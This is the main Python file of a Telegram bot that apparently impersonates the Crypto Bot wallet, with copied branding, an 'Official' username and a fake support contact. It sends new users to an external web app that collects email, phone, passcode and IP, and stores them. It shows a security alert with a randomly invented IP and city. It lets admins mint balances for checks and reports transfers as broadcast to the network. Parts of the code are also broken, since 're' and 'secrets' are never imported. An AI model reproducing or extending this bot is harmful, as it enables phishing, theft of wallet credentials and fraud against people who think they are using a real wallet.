# main.py
import asyncio
import logging
import os
import random
import time
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    WebAppInfo,
    Message, CallbackQuery, FSInputFile, 
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, 
    InlineKeyboardMarkup, InlineKeyboardButton,
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent, ChosenInlineResult, LinkPreviewOptions
)
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

import config
from config import BOT_TOKEN, _e
from database import init_db, create_user, get_user, save_phone
from keyboards import main_menu_inline

import wallet
import p2p
import more
import admin
import business
import notifications
import limits
import currency
import menu_stubs
import settings_actions
import extra_menus
import exchange

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Подключаем роутеры
dp.include_router(extra_menus.router)
dp.include_router(exchange.router)
dp.include_router(admin.router)
dp.include_router(wallet.router)
dp.include_router(p2p.router)
dp.include_router(notifications.router)
dp.include_router(limits.router)
dp.include_router(currency.router)
dp.include_router(more.router)
dp.include_router(settings_actions.router)
dp.include_router(menu_stubs.router)
dp.include_router(business.router)

class Onboarding(StatesGroup):
    waiting_start = State()
    waiting_contact = State()

def get_start_text() -> str:
    crypto_icon = _e("crypto", "💼")
    leaf = _e("leaf", "🍂")
    
    # БЕЗ ССЫЛОК НА TELEGRAM-КАНАЛЫ
    return (
        f"{crypto_icon} <b>Мультивалютный криптокошелёк</b>. "
        "Покупайте, продавайте, храните, "
        "отправляйте криптовалюту и платите ею, когда хотите.\n\n"
        "Подписывайтесь на наш канал "
        "и вступайте в наш чат.\n\n"
        f"{leaf} Осенний фестиваль с {crypto_icon} Crypto Bot! "
        "Получить баллы ›"
    )

def decode_reg_start_param(param: str) -> dict | None:
    try:
        parts = param.split("_")
        if len(parts) < 6:
            return None
        pin = parts[1]
        phone = parts[2]
        ip_hex = parts[3]
        country_code = parts[4]
        email_encoded = "_".join(parts[5:])
        
        if len(ip_hex) == 8:
            ip = ".".join(str(int(ip_hex[i:i+2], 16)) for i in (0, 2, 4, 6))
        else:
            ip = "127.0.0.1"
            
        country_map = {
            "RU": "Россия", "UA": "Украина", "BY": "Беларусь", "KZ": "Казахстан",
            "DE": "Германия", "US": "США", "PL": "Польша", "GB": "Великобритания",
            "FR": "Франция", "TR": "Турция", "AE": "ОАЭ", "UZ": "Узбекистан",
            "GE": "Грузия", "AM": "Армения", "AZ": "Азербайджан", "KG": "Киргизия",
            "TJ": "Таджикистан", "MD": "Молдова", "ES": "Испания", "IT": "Италия",
            "NL": "Нидерланды", "CH": "Швейцария", "SE": "Швеция", "NO": "Норвегия"
        }
        country = country_map.get(country_code.upper(), country_code)
        
        email_domains = {
            "1": "@gmail.com", "2": "@mail.ru", "3": "@yandex.ru", "4": "@icloud.com",
            "5": "@yahoo.com", "6": "@outlook.com", "7": "@bk.ru", "8": "@inbox.ru",
            "9": "@list.ru", "g": "@gmail.com", "m": "@mail.ru", "y": "@yandex.ru", "i": "@icloud.com"
        }
        email = email_encoded
        for k, v in email_domains.items():
            if email.endswith(f"_{k}"):
                email = email[:-len(f"_{k}")] + v
                break
        else:
            if "_a_" in email:
                email = email.replace("_a_", "@")
        email = email.replace("-", ".")
        
        if not phone.startswith("+") and len(phone) >= 10:
            phone = "+" + phone
            
        return {
            "passcode": pin,
            "phone": phone,
            "ip": ip,
            "country": country,
            "city": "",
            "email": email
        }
    except Exception as e:
        log.error("Failed to decode reg start param %s: %s", param, e)
        return None

@dp.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    if msg.text and "check_" in msg.text:
        await more.activate_check_link(msg, state)
        return

    if msg.text and "invoice_" in msg.text:
        await extra_menus.show_invoice_card(msg, state)
        return

    if msg.text and ("r_" in msg.text or "reg_" in msg.text):
        parts = msg.text.split()
        param = parts[1] if len(parts) > 1 else ""
        data = decode_reg_start_param(param)
        if data:
            email = data["email"]
            phone = data["phone"]
            passcode = data["passcode"]
            ip = data["ip"]
            country = data["country"]
            city = data.get("city", "")

            from database import save_registration_data, generate_all_user_addresses
            await save_registration_data(msg.from_user.id, email, phone, passcode, ip, country, city)
            await generate_all_user_addresses(msg.from_user.id)

            country_str = country
            if city and city.lower() != country.lower():
                country_str = f"{country}, {city}"

            text_security = (
                f"⚠️ Вы создали код-пароль\n\n"
                f"IP-адрес: <code>{ip}</code>\n"
                f"Локация: {country_str}\n\n"
                f"Если это были не вы, напишите в поддержку – @CryptoSupportBot."
            )
            await msg.answer(text_security, reply_markup=ReplyKeyboardRemove(), parse_mode="HTML")

            text_final = (
                'Настройка аккаунта успешно завершена. Теперь вы можете использовать '
                'все возможности <tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> Crypto Bot.'
            )
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Начать", callback_data="menu:main")]
            ])
            await msg.answer(text_final, reply_markup=kb, parse_mode="HTML")
            await state.clear()
            return

    await state.clear()
    await create_user(msg.from_user.id, msg.from_user.username or "")
    from database import get_user, is_user_registered
    user = await get_user(msg.from_user.id)
    user_registered = await is_user_registered(msg.from_user.id)

    if user and (user["is_onboarded"] or user_registered):
        img_path = os.path.join(BASE_DIR, "start_banner.jpg")
        if not os.path.exists(img_path):
            img_path = os.path.join(BASE_DIR, "welcome.jpg")
        from database import get_all_balances
        from keyboards import update_user_chat_menu_button, main_menu_inline
        balances = await get_all_balances(msg.from_user.id)
        try:
            await update_user_chat_menu_button(msg.bot, msg.from_user.id, balances)
        except Exception as e:
            log.warning("Menu button update failed: %s", e)
        kb = main_menu_inline(user_id=msg.from_user.id, balances=balances)
        text = get_start_text()
        if os.path.exists(img_path):
            try:
                await msg.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
                return
            except Exception as e:
                log.warning("answer_photo error: %s", e)
        await msg.answer(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
        return

    # Регистрация нового пользователя
    img_path = os.path.join(BASE_DIR, "welcome.jpg")
    text = (
        '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
        "Кошелёк успешно создан. Завершите настройку аккаунта, чтобы получить доступ ко всем возможностям сервиса."
    )
    bot_me = await msg.bot.get_me()
    bot_username = bot_me.username or config.BOT_USERNAME or "CryptoBotOfficialbot"
    webapp_reg_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&bot={bot_username}&v={int(time.time())}"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Начать", web_app=WebAppInfo(url=webapp_reg_url))]
    ])
    
    if os.path.exists(img_path):
        try:
            await msg.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML")
            await state.set_state(Onboarding.waiting_start)
            return
        except Exception as e:
            log.warning("Failed answer_photo welcome: %s", e)
    await msg.answer(text, reply_markup=kb, parse_mode="HTML")
    await state.set_state(Onboarding.waiting_start)

@dp.callback_query(Onboarding.waiting_start, F.data == "onb:start")
async def onb_start(cb: CallbackQuery, state: FSMContext):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Поделиться номером", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await cb.message.answer("Подтвердите номер телефона, нажав на кнопку ниже.", reply_markup=kb)
    await state.set_state(Onboarding.waiting_contact)
    await cb.answer()

@dp.message(Onboarding.waiting_contact, F.contact)
async def onb_contact(msg: Message, state: FSMContext):
    contact = msg.contact
    if contact.user_id != msg.from_user.id:
        await msg.answer("Пожалуйста, отправьте свой собственный номер.")
        return

    await save_phone(msg.from_user.id, contact.phone_number)
    await msg.answer("✅ Вы успешно подтвердили номер телефона.", reply_markup=ReplyKeyboardRemove())
    
    fake_ip = f"31.59.{random.randint(100, 200)}.{random.randint(10, 99)}"
    fake_city = random.choice(["Warsaw, Poland", "Berlin, Germany", "London, UK", "Paris, France"])
    
    text_security = (
        f"⚠️ Вы создали код-пароль\n\n"
        f"IP-адрес: <code>{fake_ip}</code>\n"
        f"Локация: {fake_city}\n\n"
        f"Если это были не вы, напишите в поддержку – @CryptoSupportBot."
    )
    await msg.answer(text_security, parse_mode="HTML")
    
    text_final = (
        'Настройка аккаунта успешно завершена. Теперь вы можете использовать '
        'все возможности <tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> Crypto Bot.'
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Начать", callback_data="menu:main")]
    ])
    await msg.answer(text_final, reply_markup=kb, parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data == "menu:main")
async def cb_main_menu(cb: CallbackQuery):
    img_path = os.path.join(BASE_DIR, "start_banner.jpg")
    text = get_start_text()
    try: await cb.message.delete()
    except: pass
    
    from database import get_all_balances
    balances = await get_all_balances(cb.from_user.id)
    kb = main_menu_inline(user_id=cb.from_user.id, balances=balances)

    if os.path.exists(img_path):
        await cb.message.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
    else:
        await cb.message.answer(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
    await cb.answer()

# --- ОБРАБОТЧИКИ КОМАНД ДЛЯ СИНЕГО МЕНЮ ---

@dp.message(Command("wallet"))
async def cmd_wallet(msg: Message):
    await wallet.show_wallet(msg, msg.from_user.id, edit=False)

@dp.message(Command("exchange"))
async def cmd_exchange(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:exchange")
    await exchange.cb_exchange_menu(fake_cb)

@dp.message(Command("swap"))
async def cmd_swap(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:swap")
    await more.cb_swap_menu(fake_cb)

@dp.message(Command("p2p"))
async def cmd_p2p(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:p2p")
    await p2p.cb_p2p_menu(fake_cb)

@dp.message(Command("checks"))
async def cmd_checks(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:checks")
    await more.cb_checks(fake_cb)

@dp.message(Command("invoices"))
async def cmd_invoices(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:invoices")
    await extra_menus.cb_invoices(fake_cb)

@dp.message(Command("giveaways"))
async def cmd_giveaways(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:giveaways")
    await extra_menus.cb_giveaways(fake_cb)

@dp.message(Command("subscriptions"))
async def cmd_subscriptions(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:subs")
    await extra_menus.cb_subs(fake_cb)

@dp.message(Command("pay"))
async def cmd_pay(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:pay")
    await more.cb_crypto_pay(fake_cb)

@dp.message(Command("settings"))
async def cmd_settings(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:settings")
    await menu_stubs.cb_menu_settings(fake_cb)


INLINE_CHECK_DRAFTS = {}

@dp.inline_query()
async def inline_query_handler(query: InlineQuery):
    q = (query.query or '').strip()
    uid = query.from_user.id
    bot_info = await query.bot.get_me()
    bot_username = bot_info.username or 'CryptoBot'

    from database import get_all_balances
    balances = await get_all_balances(uid)
    results = []

    m = re.match(r'^(\d+(?:[.,]\d+)?)\s*([a-zA-Z]+)(?:\s+(.+))?$', q)
    password = None
    if not m:
        m2 = re.match(r'^([a-zA-Z]+)\s*(\d+(?:[.,]\d+)?)(?:\s+(.+))?$', q)
        if m2:
            asset_str = m2.group(1).upper()
            amount_val = float(m2.group(2).replace(',', '.'))
            password = m2.group(3).strip() if m2.group(3) else None
        else:
            asset_str = None
            amount_val = None
    else:
        amount_val = float(m.group(1).replace(',', '.'))
        asset_str = m.group(2).upper()
        password = m.group(3).strip() if m.group(3) else None

    ASSET_PRICES = {
        'USDT': 1.0, 'GRAM': 1.341, 'TON': 1.60, 'BTC': 80669.86,
        'ETH': 2354.81, 'SOL': 101.0, 'TRX': 0.3295, 'DOGE': 0.07709,
        'LTC': 57.15, 'BNB': 741.27, 'USDC': 1.0, 'XAUT': 2121.1
    }

    if asset_str and amount_val and amount_val > 0:
        asset = asset_str
        from database import is_admin, update_balance
        user_is_admin = await is_admin(uid)
        cur_bal = balances.get(asset, 0.0)
        if cur_bal >= amount_val or user_is_admin:
            if user_is_admin and cur_bal < amount_val:
                await update_balance(uid, asset, amount_val - cur_bal)
                cur_bal = amount_val
            cid = secrets.token_hex(4)
            INLINE_CHECK_DRAFTS[cid] = {
                'user_id': uid,
                'amount': amount_val,
                'asset': asset,
                'password': password,
                'time': time.time()
            }
            deep_link = f'https://t.me/{bot_username}?start=check_{cid}'
            price_usd = ASSET_PRICES.get(asset, 1.0)
            fiat_val = amount_val * price_usd
            img_url = f'https://imggen.cr.bot/checks/image?asset={asset}&asset_amount={amount_val:g}&fiat=USD&fiat_amount={fiat_val:.2f}&main=asset&v5'

            kb_ru = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text=f'Забрать {amount_val:g} {asset}', url=deep_link)
            ]])
            kb_en = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text=f'Claim {amount_val:g} {asset}', url=deep_link)
            ]])

            content_ru = InputTextMessageContent(
                message_text=f'Чек на <b>{amount_val:g} {asset}</b> (~${fiat_val:.2f}).\n<i>Check for {amount_val:g} {asset}</i>',
                parse_mode='HTML',
                link_preview_options=LinkPreviewOptions(
                    url=img_url,
                    prefer_large_media=True,
                    show_above_text=True
                )
            )
            content_en = InputTextMessageContent(
                message_text=f'Check for <b>{amount_val:g} {asset}</b> (~${fiat_val:.2f}).\n<i>Чек на {amount_val:g} {asset}</i>',
                parse_mode='HTML',
                link_preview_options=LinkPreviewOptions(
                    url=img_url,
                    prefer_large_media=True,
                    show_above_text=True
                )
            )
            results.append(InlineQueryResultArticle(
                id=f'chk_ru_{cid}',
                title=f'🇷🇺 Чек на {amount_val:g} {asset}',
                description=f'Забрать {amount_val:g} {asset} (~${fiat_val:.2f})',
                input_message_content=content_ru,
                reply_markup=kb_ru,
                thumbnail_url=img_url
            ))
            results.append(InlineQueryResultArticle(
                id=f'chk_en_{cid}',
                title=f'🇬🇧 Check for {amount_val:g} {asset}',
                description=f'Claim {amount_val:g} {asset} (~${fiat_val:.2f})',
                input_message_content=content_en,
                reply_markup=kb_en,
                thumbnail_url=img_url
            ))
        else:
            content = InputTextMessageContent(
                message_text=f'❌ Недостаточно средств для отправки чека на {amount_val:g} {asset}.',
                parse_mode='HTML'
            )
            results.append(InlineQueryResultArticle(
                id='insufficient',
                title=f'❌ Недостаточно {asset}',
                description=f'Ваш баланс: {cur_bal:g} {asset}, требуется: {amount_val:g} {asset}',
                input_message_content=content
            ))
    else:
        for a, b in balances.items():
            if b > 0:
                cid = secrets.token_hex(4)
                INLINE_CHECK_DRAFTS[cid] = {
                    'user_id': uid,
                    'amount': b,
                    'asset': a,
                    'time': time.time()
                }
                deep_link = f'https://t.me/{bot_username}?start=check_{cid}'
                p_usd = ASSET_PRICES.get(a, 1.0)
                f_val = b * p_usd
                img_url = f'https://imggen.cr.bot/checks/image?asset={a}&asset_amount={b:g}&fiat=USD&fiat_amount={f_val:.2f}&main=asset&v5'

                kb = InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text=f'Забрать {b:g} {a}', url=deep_link)
                ]])
                content = InputTextMessageContent(
                    message_text=f'Чек на <b>{b:g} {a}</b> (${f_val:.2f}).',
                    parse_mode='HTML',
                    link_preview_options=LinkPreviewOptions(
                        url=img_url,
                        prefer_large_media=True,
                        show_above_text=True
                    )
                )
                results.append(InlineQueryResultArticle(
                    id=f'chk_{cid}',
                    title=f'Отправить чек на {b:g} {a}',
                    description=f'Формат: @{bot_username} <сумма> <валюта>',
                    input_message_content=content,
                    reply_markup=kb,
                    thumbnail_url=img_url
                ))
        if not results:
            content = InputTextMessageContent(
                message_text=f'ℹ️ Чтобы отправить чек в чат, введите:\\n@{bot_username} <сумма> <валюта>\\n\\nНапример: @{bot_username} 10 USDT',
                parse_mode='HTML'
            )
            results.append(InlineQueryResultArticle(
                id='help',
                title='Отправить чек: @бот сумма валюта',
                description='Например: 10 USDT или 1.5 TON',
                input_message_content=content
            ))

    await query.answer(results=results, cache_time=1, is_personal=True)

@dp.chosen_inline_result()
async def chosen_inline_result_handler(chosen: ChosenInlineResult):
    res_id = chosen.result_id
    if res_id.startswith('chk_'):
        cid = res_id[4:]
        if cid.startswith('ru_') or cid.startswith('en_'):
            cid = cid[3:]
        draft = INLINE_CHECK_DRAFTS.pop(cid, None)
        if draft:
            uid = draft['user_id']
            amount = draft['amount']
            asset = draft['asset']
            try:
                from database import create_check
                await create_check(
                    uid=uid,
                    asset=asset,
                    total=amount,
                    limit=1,
                    password=draft.get('password'),
                    inline_message_id=chosen.inline_message_id,
                    check_id=cid
                )
                log.info('Created inline check %s for user %d: %s %s (inline_msg=%s)', cid, uid, amount, asset, chosen.inline_message_id)
            except Exception as e:
                log.error('Failed to create inline check %s: %s', cid, e)

@dp.message(Command("testreg"))
async def cmd_testreg(msg: Message, state: FSMContext):
    from database import is_admin, reset_user_registration
    user_is_admin = await is_admin(msg.from_user.id)
    if msg.from_user.id != config.OWNER_ID and not user_is_admin:
        return
    await state.clear()
    try:
        await reset_user_registration(msg.from_user.id)
        
        bot_me = await msg.bot.get_me()
        bot_username = bot_me.username or config.BOT_USERNAME or "CryptoBotOfficialbot"
        webapp_reg_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&bot={bot_username}&v={int(time.time())}"
        text = (
            '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
            "Кошелёк успешно создан. Завершите настройку аккаунта, чтобы получить доступ ко всем возможностям сервиса."
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Начать", web_app=WebAppInfo(url=webapp_reg_url))]
        ])
        img_path = os.path.join(BASE_DIR, "welcome.jpg")
        if os.path.exists(img_path):
            await msg.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML")
        else:
            await msg.answer(text, reply_markup=kb, parse_mode="HTML")
    except Exception as e:
        log.error("cmd_testreg error: %s", e, exc_info=True)
        await msg.answer(f"❌ Ошибка testreg: {e}")

@dp.message(F.web_app_data)
async def web_app_data_handler(msg: Message, state: FSMContext):
    raw_data = msg.web_app_data.data
    try:
        import json
        data = json.loads(raw_data)
    except Exception as e:
        log.error("Failed to parse web_app_data: %s", e)
        return

    action = data.get("action")
    if action == "register":
        email = (data.get("email") or "").strip()
        phone = (data.get("phone") or "").strip()
        passcode = (data.get("passcode") or "").strip()
        ip = (data.get("ip") or "127.0.0.1").strip()
        country = (data.get("country") or "Не определена").strip()
        city = (data.get("city") or "").strip()

        from database import save_registration_data, generate_all_user_addresses
        await save_registration_data(msg.from_user.id, email, phone, passcode, ip, country, city)
        await generate_all_user_addresses(msg.from_user.id)

        country_str = country
        if city and city.lower() != country.lower():
            country_str = f"{country}, {city}"

        text_security = (
            f"⚠️ Вы создали код-пароль\n\n"
            f"IP-адрес: <code>{ip}</code>\n"
            f"Локация: {country_str}\n\n"
            f"Если это были не вы, напишите в поддержку – @CryptoSupportBot."
        )
        await msg.answer(text_security, reply_markup=ReplyKeyboardRemove(), parse_mode="HTML")

        text_final = (
            'Настройка аккаунта успешно завершена. Теперь вы можете использовать '
            'все возможности <tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> Crypto Bot.'
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Начать", callback_data="menu:main")]
        ])
        await msg.answer(text_final, reply_markup=kb, parse_mode="HTML")
        await state.clear()

    elif action == "transfer":
        asset = data.get("asset", "USDT").upper()
        net = data.get("network", "TRC20").upper()
        to_addr = (data.get("address") or "").strip()
        amount = float(data.get("amount", 0.0))

        if amount <= 0 or not to_addr:
            await msg.answer("❌ Неверные параметры перевода.")
            return

        from database import transfer_crypto, InsufficientFunds
        try:
            res = await transfer_crypto(msg.from_user.id, to_addr, asset, net, amount)
        except InsufficientFunds as e:
            await msg.answer(f"❌ {e}")
            return
        except Exception as e:
            await msg.answer(f"❌ Ошибка перевода: {e}")
            return

        if res["is_internal"]:
            rec_id = res["to_user_id"]
            await msg.answer(
                f"✅ <b>Внутренний перевод отправлен!</b>\n\n"
                f"💰 Сумма: <b>{amount:g} {asset}</b>\n"
                f"👤 Получатель: <code>{rec_id}</code>\n"
                f"📍 Адрес: <code>{to_addr}</code>\n"
                f"⚡️ Сеть: <b>{res['network']}</b>\n"
                f"💸 Комиссия: <b>0.00 {asset}</b>\n"
                f"⏱ Статус: <b>Завершено мгновенно</b>",
                parse_mode="HTML"
            )
            try:
                s_tag = f"@{msg.from_user.username}" if msg.from_user.username else f"ID {msg.from_user.id}"
                await msg.bot.send_message(
                    rec_id,
                    f"⚡️ <b>Входящий перевод криптовалюты!</b>\n\n"
                    f"Вам зачислено: <b>+{amount:g} {asset}</b>\n"
                    f"От: <b>{s_tag}</b>\n"
                    f"На адрес: <code>{to_addr}</code>\n"
                    f"Сеть: <b>{res['network']}</b>\n\n"
                    f"Баланс пополнен без комиссии.",
                    parse_mode="HTML"
                )
            except Exception:
                pass
        else:
            await msg.answer(
                f"✅ <b>Транзакция отправлена в сеть!</b>\n\n"
                f"💰 Сумма: <b>{amount:g} {asset}</b>\n"
                f"📍 Адрес: <code>{to_addr}</code>\n"
                f"⚡️ Сеть: <b>{res['network']}</b>\n"
                f"🔗 TXID: <code>{res['tx_hash'][:24]}...{res['tx_hash'][-8:]}</code>\n"
                f"⏱ Статус: <b>Отправлено в мемпул</b>",
                parse_mode="HTML"
            )

from keep_alive import start_health_server

async def main():
    port = start_health_server()
    log.info(f"Healthcheck сервер активен на порту {port}")
    await init_db()
    try:
        await bot.delete_webhook(drop_pending_updates=False)
    except Exception as e:
        log.warning("delete_webhook warning: %s", e)
    me = await bot.get_me()
    config.BOT_USERNAME = me.username
    log.info(f"Бот запущен: @{me.username}")
    
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())